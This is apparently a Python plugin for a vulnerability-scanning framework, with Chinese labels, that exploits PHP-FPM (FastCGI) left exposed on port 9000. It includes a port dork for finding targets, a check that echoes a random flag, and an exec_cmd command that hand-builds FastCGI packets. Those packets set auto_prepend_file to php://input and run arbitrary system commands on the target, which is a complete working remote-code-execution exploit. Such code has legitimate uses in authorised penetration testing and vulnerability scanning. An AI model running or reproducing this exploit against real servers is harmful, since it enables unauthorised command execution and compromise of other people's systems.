# -*-* coding:UTF-8
import random
import socket
import contextlib
from io import BytesIO


class Plugin(Base):
    __info__ = {
        "name": "PHP-FastCGI未授权访问漏洞",
        "dork": "port=\"9000\"",
        "description": "PHP-FPM是一个fastcgi协议解析器，Nginx等服务器中间件将用户请求按照fastcgi的规则打包好传给FPM。FPM按照fastcgi的协议将TCP流解析成真正的数据。 PHP-FPM默认监听9000端口，如果这个端口暴露在公网，则我们可以自己构造fastcgi协议，和fpm进行通信。",
        "references": ["-"],
    }

    def url(self) -> dict:
        flag = self.build_random_str(32)
        res = self.exec_cmd(self.target.ip, self.target.port, f'echo {flag}')
        if res and flag in res:
            return {"LoopholeInfo": self.__info__}

    @staticmethod
    def custom_encode(_id, _type, content):
        data = bytes([1]) + bytes([_type]) + bytes([(_id >> 8) & 0xFF]) + bytes([_id & 0xFF]) + bytes(
            [(len(content) >> 8) & 0xFF]) + bytes([len(content) & 0xFF]) + bytes([0]) + bytes([0]) + content.encode()
        return data

    @cli.command(description='执行系统命令')
    @cli.options("ip", help="攻击的IP", default="{self.target.ip}")
    @cli.options("port", help="攻击的端口", type=int, default="{self.target.port}")
    @cli.options("cmd", help="执行的命令", default="whoami")
    @cli.options("file", help="存在的文件", default='/usr/local/lib/php/PEAR.php,/usr/share/php/OS/Guess.php,/usr/share/php/PEAR.php')
    def exec_cmd(self, ip, port, cmd, file):
        for path in file.split(','):
            with contextlib.suppress(Exception):
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(15)
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    s.connect((ip, port))
                    code = f"<?php system('{cmd}');?>"
                    request_id = random.randint(1, (1 << 16) - 1)
                    buf = self.custom_encode(request_id, 1, '\x00\x01\x00\x00\x00\x00\x00\x00')
                    buf += self.custom_encode(request_id, 4,
                                              f'\x11\x0bGATEWAY_INTERFACEFastCGI/1.0\x0e\x04REQUEST_METHODPOST\x0f\x1bSCRIPT_FILENAME{path}\x0b\x1bSCRIPT_NAME{path}\x0c\x00QUERY_STRING\x0b\x1bREQUEST_URI{path}\r\x01DOCUMENT_ROOT/\x0f\x0eSERVER_SOFTWAREphp/fcgiclient\x0b\tREMOTE_ADDR127.0.0.1\x0b\x04REMOTE_PORT9985\x0b\tSERVER_ADDR127.0.0.1\x0b\x02SERVER_PORT80\x0b\tSERVER_NAMElocalhost\x0f\x08SERVER_PROTOCOLHTTP/1.1\x0c\x10CONTENT_TYPEapplication/text\x0e\x02CONTENT_LENGTH{len(code)}\t\x1fPHP_VALUEauto_prepend_file = php://input\x0f\x16PHP_ADMIN_VALUEallow_url_include = On')
                    buf += self.custom_encode(request_id, 4, '')
                    buf += self.custom_encode(request_id, 5, code)
                    buf += self.custom_encode(request_id, 5, '')
                    s.send(buf)
                    data = s.recv(1024)
                    buffer = BytesIO(data)
                    response = ""
                    while True:
                        stream = buffer.read(8)
                        if not stream:
                            break
                        headers = {
                            'version': stream[0],
                            'type': stream[1],
                            'requestId': (stream[2] << 8) + stream[3],
                            'contentLength': (stream[4] << 8) + stream[5],
                            'paddingLength': stream[6],
                            'reserved': stream[7],
                            'content': b''
                        }
                        if 'contentLength' in headers.keys():
                            contentLength = int(headers['contentLength'])
                            headers['content'] += buffer.read(contentLength)
                        if 'paddingLength' in headers.keys():
                            buffer.read(int(headers['paddingLength']))
                        if request_id == int(headers['requestId']):
                            response += headers['content'].replace(b'\x00', b'').decode()
                    return response.split('\r\n')[-1]
